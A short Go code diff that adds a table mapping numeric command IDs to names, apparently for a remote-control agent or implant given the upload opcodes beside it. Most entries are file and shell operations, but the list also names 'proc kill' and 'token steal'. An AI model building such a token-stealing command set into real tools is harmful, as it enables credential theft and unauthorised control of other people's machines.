@@ -370,3 +370,23 @@ const (
 	UPLOAD_CONTINUE = 0xc3
 	UPLOAD_DONE = 0xc4
 )
+
+var CmdNames = map[int]string{
+	0:  "ps",
+	1:  "cmd",
+	2:  "cat",
+	3:  "ls",
+	4:  "rm",
+	5:  "mv",
+	6:  "pwd",
+	7:  "cd",
+	8:  "cp",
+	9:  "rmdir",
+	10: "whoami",
+	11: "mkdir",
+	12: "download",
+	13: "upload",
+	14: "reconfig",
+	15: "proc kill",
+	16: "token steal",
+}
